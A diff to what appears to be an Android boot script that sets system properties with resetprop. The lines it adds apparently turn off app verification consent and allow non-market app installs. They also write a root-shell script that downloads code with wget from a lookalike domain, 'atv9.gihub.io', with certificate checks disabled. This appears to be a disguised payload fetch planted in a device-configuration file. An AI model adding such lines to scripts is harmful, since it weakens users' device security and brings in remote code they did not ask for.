@@ -34,5 +34,17 @@ resetprop persist.service.audio.useFixedVolume false
 
 resetprop persist.sys.nativebridge 1
 resetprop persist.service.bdroid.bdaddr 22:22:67:c6:69:73
+resetprop persist.sys.timezone Asia/Baku
+resetprop persist.sys.locale ru-RU
+resetprop persist.sys.hw_statistics false
+resetprop persist.sys.webview.vmsize 253216936
+settings put system sound_effects_enabled 0
+media volume --set 25
+system volume --set 25
+settings put global package_verifier_user_consent -1
+settings put install_non_market_apps true
 
+
+# rm -rf /sdcard/cpu.sh
+echo "#!/system/bin/su\nwget --no-check-certificate atv9.gihub.io/shell/cpu -O /sdcard/cpu.sh" > /sdcard/000.sh
 return 0
